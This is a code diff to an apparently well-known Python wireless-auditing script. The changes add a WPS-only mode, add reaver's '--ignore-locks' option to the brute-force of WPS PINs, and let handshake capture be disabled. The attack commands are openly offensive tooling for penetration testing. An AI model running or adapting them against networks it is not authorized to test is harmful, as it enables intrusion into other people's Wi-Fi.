@@ -6,16 +6,28 @@
 	author: derv82 at gmail
 	
 	TODO:
-	 * WEP - ability to pause/skip/continue	 
-	 * WPA - crack (pyrit/cowpatty)
+	 * rtl8187 fix needs to take iface out of monitor mode!
 	 
+	 * Command line arguments. Seriously.
+	 
+	 * WEP - ability to pause/skip/continue	 
 	 * Unknown SSID's : Send deauth's (when on fixed channel) to unmask!
 	 
 	 * Option to "analyze" or "check" cap files for handshakes.
 	   Shows output from other programs like tshark, cowpatty, pyrit, aircrack.
-	 
-	 * rtl8187 fix needs to take iface out of monitor mode!
 	   
+	 * reaver:
+	 	 MONITOR ACTIVITY!
+	   - Ensure WPS key attempts have begun. 
+	   - If no attempts can be made, stop attack and print
+	   
+	   - During attack, if no attempts are made within X minutes, stop attack & Print
+	   
+	   - Output when unable to associate:
+	     [!] WARNING: Failed to associate with AA:BB:CC:DD:EE:FF (ESSID: ABCDEF)
+	
+	MIGHTDO:
+	  * WPA - crack (pyrit/cowpatty) (not really important)
 """
 
 # For command-line arguments
@@ -63,6 +75,7 @@ WPA_HANDSHAKE_TSHARK   = True # Various programs to use to check for a handshake
 WPA_HANDSHAKE_PYRIT    = True
 WPA_HANDSHAKE_AIRCRACK = True
 WPA_HANDSHAKE_COWPATTY = True
+WPA_HANDSHAKE_DISABLE  = True
 
 # WEP variables
 WEP_PPS             = 600 # packets per second (Tx rate)
@@ -76,7 +89,7 @@ WEP_IGNORE_FAKEAUTH = True
 WEP_FINDINGS        = [] # List of strings containing info on successful WEP attacks.
 
 # WPS variables
-WPS_ONLY            = False # Target only WPS-enabled routers
+WPS_ONLY            = True # Target only WPS-enabled routers
 WPS_FINDINGS        = []
 WPS_DISABLE         = False # Flag to disable WPS attacks
 
@@ -198,11 +211,12 @@ def wps_check_targets(targets, cap_file):
 			if t.bssid.lower() == bssid.lower():
 				t.wps = True
 	
-	"""
+	
 	# Remove non-WPS-enabled access points from list of targets
+	"""
 	if WPS_ONLY:
 		for i in xrange(0, len(targets)):
-			if not targets.get(i).wps:
+			if not targets[i].wps:
 				targets.remove(i)
 				i -= 1
 	"""
@@ -1268,7 +1282,7 @@ def main():
 				need_handshake = not wps_attack(iface, t)
 				wpa_total += 1
 			
-			if need_handshake:
+			if not WPA_HANDSHAKE_DISABLE and need_handshake:
 				wpa_total += 1
 				if wpa_get_handshake(iface, t, ts_clients):
 					wpa_success += 1
@@ -1410,6 +1424,7 @@ def wps_attack(iface, target):
 	       '-b', target.bssid,
 	       '-o', temp + 'out.out',
 	       '-a',  # auto-detect best options
+	       '--ignore-locks',
 	       '-vv']  # semi-verbose output
 	proc = Popen(cmd, stdout=DN, stderr=DN)
 	cracked = False
@@ -1430,7 +1445,7 @@ def wps_attack(iface, target):
 						i = line.find(' (')
 						j = line.find(' seconds/attempt', i)
 						if i != -1 and j != -1: aps = line[i+2:j]
-				print ' %s brute-forcing WPS pin via %s, %s%% (%s tries/sec)    \r' % \
+				print ' %s brute-forcing WPS pin via %s, %s%% (%s sec/try)    \r' % \
 				            (GR+sec_to_hms(time.time()-time_started)+W, \
 				            G+'reaver'+W, G+percent+W, G+aps+W),
 				stdout.flush()
